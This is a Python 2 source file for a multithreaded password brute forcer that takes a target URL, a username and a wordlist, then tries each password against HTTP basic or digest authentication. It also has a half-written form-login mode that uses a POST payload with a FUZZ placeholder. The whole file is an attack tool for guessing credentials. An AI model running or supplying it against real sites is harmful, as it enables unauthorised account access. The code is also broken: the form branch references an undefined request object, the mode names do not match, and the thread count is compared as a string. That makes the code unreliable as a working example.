import requests
from threading import Thread
import sys
import time
import getopt
from termcolor import colored
from requests.auth import HTTPDigestAuth

global hit  # Flag to know when we have a valid password
hit = "1"


def banner():
    print "\n***************************************"
    print "* Password brute forcer 1.0*"
    print "***************************************"


def usage():
    print "Usage:"
    print "\t-w: url (http://somesite.com/admin)"
    print "\t-u: username"
    print "\t-t: threads"
    print "\t-f: dictionary file"
    print "\t-m: method (basic, digest, forms)"
    print "\t-p: POST payload\n"
    print "example: back2forms.py -w http://www.somesite.com/admin -t 5 -f pass.txt -m forms -p \"username=admin&password=FUZZ\"\n"


class request_performer(Thread):
    def __init__(self, name, user, url, method, payload):
        Thread.__init__(self)
        self.password = name.split("\n")[0]
        self.username = user
        self.url = url
        self.method = method
        self.payload = payload
        print "-" + self.password + "-"

    def run(self):
        global hit
        if hit == "1":
            try:
                if self.method == "basic":
                    r = requests.get(self.url, auth=(self.username, self.password))
                elif self.method == "digest":
                    r = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.password))
                elif self.method == "form":
                    post_payload = r.requests.post()

                if r.status_code == 200:
                    hit = "0"
                    print "[+] Password found - " + colored(self.password, 'green') + "  - !!!\r"
                    sys.exit()
                else:
                    print "Not valid " + self.password
                    i[0] = i[0] - 1  # Here we remove one thread from the counter
            except Exception, e:
                print e


def start(argv):
    banner()
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, "u:w:f:m:p:t:")
    except getopt.GetoptError:
        print "Error en arguments"
        sys.exit()
    method = "basic"
    payload = ""
    for opt, arg in opts:
        if opt == '-u':
            user = arg
        elif opt == '-w':
            url = arg
        elif opt == '-f':
            dictio = arg
        elif opt == '-m':
            method = arg
        elif opt == '-p':
            payload = arg
        elif opt == '-t':
            threads = arg
    try:
        f = open(dictio, "r")
        name = f.readlines()
    except:
        print"Failed opening file: " + dictio + "\n"
        sys.exit()
    launcher_thread(name, threads, user, url, method, payload)


def launcher_thread(names, th, username, url, method, payload):
    global i
    i = []
    i.append(0)
    while len(names):
        if hit == "1":
            try:
                if i[0] < th:
                    n = names.pop(0)
                    i[0] = i[0] + 1
                    thread = request_performer(n, username, url, method, payload)
                    thread.start()

            except KeyboardInterrupt:
                print "Brute forcer interrupted  by user. Finishing attack.."
                sys.exit()
            thread.join()
        else:
            sys.exit()
    return


if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print "Brute force interrupted by user, killing all threads..!!"
